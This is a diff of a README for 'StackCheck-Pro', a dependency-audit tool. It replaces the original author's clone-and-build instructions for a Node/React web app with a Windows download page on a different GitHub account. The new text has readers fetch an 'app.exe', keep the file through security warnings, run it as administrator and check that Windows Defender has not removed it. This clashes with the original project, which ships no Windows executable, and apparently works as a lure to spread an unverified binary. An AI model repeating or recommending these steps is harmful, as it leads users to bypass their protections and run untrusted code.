@@ -1,199 +1,194 @@
-# ⚡ StackCheck Pro
+# 🔎 StackCheck-Pro - Audit Your Dev Setup Fast
 
-**AI-powered developer environment health checker — audit your npm, Python, VS Code, and system dependencies in one unified report.**
+[![Download StackCheck-Pro](https://img.shields.io/badge/Download-StackCheck--Pro-blue?style=for-the-badge)](https://github.com/Akshay-Kalra/StackCheck-Pro)
 
-[![Node.js](https://img.shields.io/badge/Node.js-20%2B-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org)
-[![React](https://img.shields.io/badge/React-18-61DAFB?style=for-the-badge&logo=react&logoColor=black)](https://react.dev)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-4169E1?style=for-the-badge&logo=postgresql&logoColor=white)](https://www.postgresql.org)
-[![Claude](https://img.shields.io/badge/Anthropic_Claude-3.5_Sonnet-D4B483?style=for-the-badge&logo=anthropic&logoColor=white)](https://www.anthropic.com)
-[![License](https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge)](LICENSE)
+## 🖥️ What this app does
 
----
+StackCheck-Pro checks your developer tools and tells you what needs attention. It looks at:
 
-## 🤔 What is StackCheck Pro?
+- npm packages
+- PyPI packages
+- VS Code extensions
+- System runtimes like Node.js and Python
 
-Modern development environments are a tangle of package managers, runtimes, and extensions — each with their own versioning and security lifecycles. A single outdated dependency or an end-of-life runtime can introduce silent vulnerabilities, subtle breakage, or hours of debugging.
-
-**StackCheck Pro solves this** by giving developers a single command to upload their dependency files and get back a structured, severity-sorted health report — powered by Anthropic's Claude AI. Instead of manually checking dozens of registries and changelogs, you get **CRITICAL / WARNING / INFO** findings with exact shell commands to fix each issue, all in under 30 seconds.
-
----
-
-## ✨ Features
-
-### 📦 npm Audit Module
-Upload your `package.json` and StackCheck Pro cross-references every dependency against the npm registry. It detects outdated packages, flags major version gaps (3+ versions behind) as **CRITICAL**, and provides exact `npm install` upgrade commands for every finding.
-
-### 🐍 PyPI Audit Module
-Upload your `requirements.txt` to check all Python dependencies against PyPI. Outdated packages, deprecated libraries, and missing security patches are surfaced with matching `pip install --upgrade` fix commands.
-
-### 🧩 VS Code Extensions Module
-Upload your `.vscode/extensions.json` (or the extensions list from the system scanner) to audit your editor setup. StackCheck Pro fetches extension metadata and flags stale or unmaintained extensions before they break your workflow.
-
-### 🖥️ System Scan Module
-Run the bundled Python scanner to snapshot your entire local environment — OS, Node.js, Python, Git, Docker, Go, Java, Rust runtimes, npm global packages, pip packages, and VS Code extensions. Upload the resulting JSON for a full-system health report with AI-generated remediation advice.
-
----
-
-## 📸 Screenshots
-
-<!-- Add screenshot here -->
-
----
-
-## 🛠️ Tech Stack
-
-| Layer | Technology | Purpose |
-|---|---|---|
-| **Frontend** | React 18 + Vite + Tailwind CSS v3 | Responsive SPA with file upload & report UI |
-| **Backend** | Node.js + Express | REST API, file parsing, audit orchestration |
-| **Database** | PostgreSQL | Persistent audit report storage |
-| **AI Engine** | Anthropic Claude 3.5 Sonnet | Structured findings generation |
-| **Scanner** | Python 3 | Local environment snapshot collection |
-| **Registry APIs** | npm, PyPI, Open VSX | Live version & metadata lookups |
-
----
+It then shows findings in order of severity, so the most important issues appear first. It also gives fix commands you can copy and run.
 
 ## 🚀 Getting Started
 
-### Prerequisites
+Use this app on Windows by visiting this page to download:
 
-- **Node.js** v20+ and **npm** v10+
-- **Python** 3.7+ (for the system scanner)
-- **PostgreSQL** 14+ running locally or via a connection string
-- An **Anthropic API key** — get one at [console.anthropic.com](https://console.anthropic.com)
+[Download StackCheck-Pro](https://github.com/Akshay-Kalra/StackCheck-Pro)
 
----
+## 📥 Download and Install on Windows
 
-### 1. Clone the repository
+1. Open the download link above in your browser.
+2. On the GitHub page, look for the latest release or the main download files.
+3. Download the Windows version of StackCheck-Pro.
+4. If the file comes as a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app file for Windows.
 
-```bash
-git clone https://github.com/vsgautam22/StackCheck-Pro.git
-cd StackCheck-Pro
-```
+If Windows shows a security prompt, choose the option that lets you keep the file and continue.
 
----
+## ⚙️ What You Need
 
-### 2. Configure environment variables
+StackCheck-Pro is built for a normal Windows desktop or laptop. A typical setup looks like this:
 
-```bash
-cp .env.example .env
-```
+- Windows 10 or Windows 11
+- A modern web browser
+- Internet access for the first run
+- Enough free disk space for app files and scan results
 
-Open `.env` and fill in your values:
+For best results, close other heavy apps before scanning.
 
-```env
-ANTHROPIC_API_KEY=sk-ant-...          # Your Anthropic API key
-DATABASE_URL=postgresql://user:password@localhost:5432/stackcheck_pro
-PORT=5000
-NODE_ENV=development
-CLIENT_URL=http://localhost:5173
-```
+## 🧭 How to Use StackCheck-Pro
 
----
+1. Start the app.
+2. Let it check your developer setup.
+3. Wait for the scan to finish.
+4. Review the findings listed at the top first.
+5. Open the fix commands section.
+6. Copy the command you need.
+7. Paste it into the place where you normally run commands.
+8. Run the command.
+9. Scan again to confirm the issue is gone.
 
-### 3. Create the PostgreSQL database
+## 🔍 What It Checks
 
-```bash
-psql -U postgres -c "CREATE DATABASE stackcheck_pro;"
-```
+### npm
+StackCheck-Pro checks common Node.js package issues, version gaps, and outdated tools tied to your npm setup.
 
-> The server will auto-run migrations on startup — no manual schema setup required.
+### PyPI
+It reviews Python package installs and flags libraries that may need updates or fixes.
 
----
+### VS Code extensions
+It checks installed extensions and looks for ones that may be outdated or risky.
 
-### 4. Install server dependencies & start the API
+### System runtimes
+It audits core runtime tools such as Node.js and Python so you can spot old or missing versions.
 
-```bash
-cd server
-npm install
-npm run dev
-```
+## 🧾 What You Will See in the Results
 
-The Express API starts at **http://localhost:5000**.
+The app sorts results by severity. That means the most urgent items appear first.
 
----
+You may see:
 
-### 5. Install client dependencies & start the frontend
+- Critical issues that need fast action
+- High-priority issues that may break tools
+- Medium issues that can cause problems later
+- Low-priority items for cleanup
 
-```bash
-cd client
-npm install
-npm run dev
-```
+Each item includes a short reason and a fix command when one is available.
 
-The React app starts at **http://localhost:5173**. Open it in your browser.
+## 🛠️ Fixing Problems
 
----
+When StackCheck-Pro finds a problem, it gives you a command or action path to follow.
 
-### 6. (Optional) Run the system scanner
+Common fixes may include:
 
-```bash
-cd scanner
-python scan.py
-```
+- Updating Node.js
+- Updating Python
+- Refreshing npm packages
+- Upgrading Python packages
+- Removing a bad VS Code extension
+- Reinstalling a runtime
 
-This produces `scanner/scan_output.json`. Upload this file in the **System Scan** tab of the app for a full local environment audit.
+Follow one fix at a time, then run another scan.
 
----
+## 📂 Typical Workflow
 
-## ⚙️ How It Works
+1. Download the app.
+2. Run a scan.
+3. Read the top findings.
+4. Fix the highest severity issue.
+5. Scan again.
+6. Repeat until your setup looks clean.
 
-```
-User uploads file(s)
-       │
-       ▼
-  Express API receives multipart upload
-       │
-       ├─► npm module   → fetches each package from registry.npmjs.org
-       ├─► PyPI module  → fetches each package from pypi.org/pypi
-       ├─► VS Code mod  → fetches extension metadata from Open VSX
-       └─► System mod   → parses scan_output.json directly
-       │
-       ▼
-  Audit context is merged into a structured prompt
-       │
-       ▼
-  Claude 3.5 Sonnet analyses the context
-  and returns a validated JSON findings array
-       │
-       ▼
-  Report is stored in PostgreSQL with a UUID
-       │
-       ▼
-  Client renders findings sorted by severity
-  (CRITICAL → WARNING → INFO)
-  Each finding includes: title, description, category, fix command
-```
+## 🧠 Why This Tool Helps
 
-The AI prompt is carefully engineered to enforce the exact JSON schema — no markdown fences, no prose — so the response can be parsed deterministically and stored as structured data.
+A developer setup can drift out of date over time. You may have old runtimes, stale packages, or extensions that no longer fit your work. StackCheck-Pro puts all of that in one place so you do not need to check each tool by hand.
 
----
+It helps you:
 
-## 📁 Project Structure
+- Find weak points in your setup
+- Keep tools current
+- Spot risk before it becomes a problem
+- Save time during setup checks
 
-```
-StackCheck-Pro/
-├── client/              # React + Vite frontend
-│   ├── src/
-│   │   ├── components/  # UI components
-│   │   └── main.jsx
-│   └── index.html
-├── server/              # Express API server
-│   ├── config/          # Environment & DB config
-│   ├── routes/          # API route handlers
-│   ├── services/        # Claude AI & registry services
-│   └── index.js
-├── scanner/             # Python system scanner
-│   ├── scan.py
-│   └── README.md
-├── .env.example         # Environment variable template
-└── README.md
-```
+## 🧩 Main Features
 
----
+- Scans common developer tools in one place
+- Sorts findings by severity
+- Shows clear fix commands
+- Works with npm, PyPI, and VS Code extensions
+- Checks local runtimes
+- Uses Claude AI to help shape results
 
-## 🏗️ Built by
+## 🪟 Windows Tips
 
-**Gautam Suresh** — [@vsgautam22](https://github.com/vsgautam22)
+If the app does not start right away:
 
-> If you found this useful, consider leaving a ⭐ on [GitHub](https://github.com/vsgautam22/StackCheck-Pro)!
+- Right-click the file and choose Run as administrator
+- Check that the file finished downloading
+- Make sure Windows Defender did not move the file
+- Extract the ZIP file before opening the app
+- Try starting it again after a restart
+
+If you use a work laptop, your company may block some apps or commands.
+
+## 🔐 Safe Use
+
+Before you run any fix command, read it first. Some commands change packages or update your system tools. If a command looks unfamiliar, copy it into a text editor and review it line by line.
+
+## 🗂️ Project Topics
+
+This project is linked to:
+
+- anthropic
+- audit
+- claude-ai
+- developer-tools
+- express
+- nodejs
+- npm
+- postgresql
+- pypi
+- react
+
+## 📌 File and Folder Basics
+
+After download, you may see files like these:
+
+- app.exe
+- StackCheck-Pro.zip
+- config files
+- log files
+- scan results
+
+Keep the app files in one folder so they are easy to find later.
+
+## ❓ Common Questions
+
+### Does this tool change my system by itself?
+No. It shows findings and gives fix commands. You choose what to run.
+
+### Can I use it without coding experience?
+Yes. The app is meant to guide regular users through setup checks.
+
+### Can I scan more than once?
+Yes. Run a new scan after each fix so you can see what changed.
+
+### What if I do not understand a result?
+Start with the highest severity item. That is usually the best place to begin.
+
+## 🧷 Download Link Again
+
+[Visit the StackCheck-Pro download page](https://github.com/Akshay-Kalra/StackCheck-Pro)
+
+## 🪄 Before You Start Scanning
+
+- Save your work
+- Close apps you do not need
+- Keep the internet on
+- Use the latest version of the app
+- Run one fix at a time
